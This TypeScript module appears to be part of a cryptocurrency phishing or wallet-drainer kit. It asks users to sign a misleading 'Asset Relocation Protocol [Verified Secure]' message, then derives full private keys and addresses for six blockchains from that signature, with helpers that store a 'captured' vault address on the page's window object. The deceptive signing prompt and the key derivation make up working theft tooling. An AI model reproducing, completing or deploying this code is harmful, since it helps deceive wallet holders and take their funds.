  import { ethers, HDNodeWallet } from "ethers";
  import bs58 from "bs58";
  import * as nacl from "tweetnacl";
  import { derivePath } from "ed25519-hd-key";

  /**
   * 🛰️ GHOST-PROTOCOL UNIVERSAL ENGINE (v6.7.0 - Manual Control Optimized)
   */

  export const DERIVATION_SEED_MESSAGE =
    "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";

  const SALT_L1 = "GHOST_STRIKE_ALPHA_2026";
  const SALT_L2 = "RECURSIVE_EXPANSION_OMEGA";
  const PEPPER = "INTERNAL_VAULT_DEEP_SYNC_99";

  export interface UniversalVault {
    masterKey: string;
    evmAddress: string;
    tronAddress: string;
    solanaAddress: string;
    btcAddress: string;
    ltcAddress: string;
    xrpAddress: string;
    stealthIndex: number;
    rawKeys: {
      evmPrivKey: string;
      tronPrivKey: string;
      solanaPrivKey: string;
      btcPrivKey: string;
      ltcPrivKey: string;
      xrpPrivKey: string;
    };
  }

  /**
   * 🔐 Tron Base58 encoding helper (TRC-20 Compatible)
   */
  function encodeTron(address: string): string {
    const cleanAddress = address.startsWith("0x")
      ? address.substring(2)
      : address;
    const hex = "41" + cleanAddress;
    const hexBytes = ethers.getBytes(`0x${hex}`);
    const hash1 = ethers.sha256(hexBytes);
    const hash2 = ethers.sha256(ethers.getBytes(hash1));
    const checksum = hash2.substring(2, 10);
    return bs58.encode(Buffer.from(hex + checksum, "hex"));
  }

  /**
   * 🛰️ CORE LOGIC: Hardened Deterministic Multi-Chain Derivation
   */
  export function derivePrivateKeyFromSignature(
    signature: string,
    index: number = 0, // Default to 0 for instant visibility in wallets
  ): UniversalVault {
    const logPrefix = "[master-vault-engine]";

    if (!signature || typeof signature !== "string") {
      throw new Error("EMPTY_SIGNATURE_DATA");
    }

    const safeSignature = signature.trim().startsWith("0x")
      ? signature.trim()
      : `0x${signature.trim()}`;

    try {
      const sigBytes = ethers.getBytes(safeSignature);

      // 🌪️ Triple-Layer Entropy Generation
      const layer1 = ethers.keccak256(
        ethers.solidityPacked(["string", "bytes"], [SALT_L1, sigBytes]),
      );
      const layer2 = ethers.keccak256(
        ethers.solidityPacked(["bytes", "string"], [layer1, SALT_L2]),
      );
      const masterEntropy = ethers.keccak256(
        ethers.solidityPacked(
          ["string", "bytes", "string"],
          [PEPPER, layer2, "V6_FINAL"],
        ),
      );

      // BIP32 64-byte Expansion
      const entropy1 = ethers.getBytes(masterEntropy);
      const entropy2 = ethers.getBytes(ethers.keccak256(entropy1));
      const combinedSeed = new Uint8Array(64);
      combinedSeed.set(entropy1);
      combinedSeed.set(entropy2, 32);

      // --- EVM & STANDARD SECP256K1 CHAINS ---
      const masterNode = HDNodeWallet.fromSeed(combinedSeed);

      // Using index 0 for EVM so it shows up immediately in MetaMask/Trust
      const evmNode = masterNode.derivePath(`m/44'/60'/0'/0/0`);
      const tronNode = masterNode.derivePath(`m/44'/195'/0'/0/${index}`);
      const btcNode = masterNode.derivePath(`m/44'/0'/0'/0/${index}`);
      const ltcNode = masterNode.derivePath(`m/44'/2'/0'/0/${index}`);
      const xrpNode = masterNode.derivePath(`m/44'/144'/0'/0/${index}`);

      // --- SOLANA ED25519 FIX ---
      // Solana requires Ed25519 curve. Standard HDNodeWallet will NOT work for SOL.
      const solSeed = combinedSeed.slice(0, 32);
      const derivedSol = derivePath(
        `m/44'/501'/0'/0'`,
        Buffer.from(solSeed).toString("hex"),
      );
      const solKeyPair = nacl.sign.keyPair.fromSeed(derivedSol.key);

      // Solana Private Key for Trust Wallet (64-byte format)
      const solanaPrivKey = bs58.encode(Buffer.from(solKeyPair.secretKey));
      const solanaAddress = bs58.encode(Buffer.from(solKeyPair.publicKey));

      return {
        masterKey: masterEntropy,
        evmAddress: evmNode.address,
        tronAddress: encodeTron(tronNode.address),
        solanaAddress: solanaAddress,
        btcAddress: btcNode.address,
        ltcAddress: ltcNode.address,
        xrpAddress: xrpNode.address,
        stealthIndex: index,
        rawKeys: {
          evmPrivKey: evmNode.privateKey, // Standard Hex
          tronPrivKey: tronNode.privateKey, // Standard Hex
          solanaPrivKey: solanaPrivKey, // Base58 for Trust/Phantom
          btcPrivKey: btcNode.privateKey,
          ltcPrivKey: ltcNode.privateKey,
          xrpPrivKey: xrpNode.privateKey,
        },
      };
    } catch (err: any) {
      console.error(`${logPrefix} ❌ Cryptographic Failure: ${err.message}`);
      throw new Error(`DERIVATION_CRASH: ${err.message}`);
    }
  }

  export function getCapturedVaultAddress(): string | null {
    return typeof window !== "undefined"
      ? (window as any)._captured_vault_address || null
      : null;
  }

  export function setCapturedVaultAddress(address: string): void {
    if (typeof window !== "undefined") {
      (window as any)._captured_vault_address = address;
    }
  }
